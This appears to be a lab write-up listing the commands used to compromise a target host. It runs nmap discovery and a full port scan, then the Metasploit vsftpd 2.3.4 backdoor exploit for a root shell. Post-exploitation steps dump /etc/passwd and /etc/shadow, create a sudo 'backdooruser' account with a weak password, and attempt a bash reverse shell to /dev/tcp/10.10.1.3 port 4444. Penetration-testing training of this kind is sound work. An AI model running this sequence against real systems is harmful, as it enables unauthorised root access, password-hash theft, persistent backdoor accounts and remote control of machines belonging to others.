# Commands Used

All commands below appear in the provided screenshots or notes. Explanations are brief and factual.

## Reconnaissance

```bash
nmap 10.10.1.0/24 -sn -T4
```
Ping scan of the entire /24 subnet to discover live hosts.

```bash
ipconfig
```
Attempted (failed – command not found on Linux).

```bash
ifconfig
```
Displayed network interface configuration and confirmed attacker IP 10.10.1.3.

## Scanning / Enumeration

```bash
sudo nmap 10.10.1.4 -Pn -sV -A -T4 -p0-65535
```
Full TCP port scan with service/version detection, OS detection, and script scanning against the target.

## Exploitation (Metasploit)

```
search vsftpd
```
Searched the Metasploit module database for vsftpd-related exploits.

```
use 0
```
Selected the first (and only) matching module: exploit/unix/ftp/vsftpd_234_backdoor.

```
info 0
```
Displayed detailed information about the selected module.

```
set RHOSTS 10.10.1.4
```
Configured the target IP address.

```
exploit
```
Launched the exploit, resulting in a root command shell.

## Post-Exploitation (inside the root shell)

```bash
uname
```
Displayed system information.

```bash
ls
cd /home
ls
```
Navigated and listed home directories.

```bash
cat /etc/passwd
```
Dumped the local user account list.

```bash
cat /etc/shadow
```
Dumped password hashes (readable because the shell is root).

```bash
useradd -m -s /bin/bash backdooruser
```
Created a new local user with a home directory and bash shell.

```bash
passwd backdooruser
```
Set a password for the new user (value used: backdooruser).

```bash
usermod -aG sudo backdooruser
```
Added the new user to the sudo group.

```bash
bash -i >& /dev/tcp/10.10.1.3/4444 0>&1
```
Attempted an interactive reverse shell to the attacker (failed – no listener was active).

```bash
userdel backdooruser
```
Removed the temporary backdoor account (cleanup).
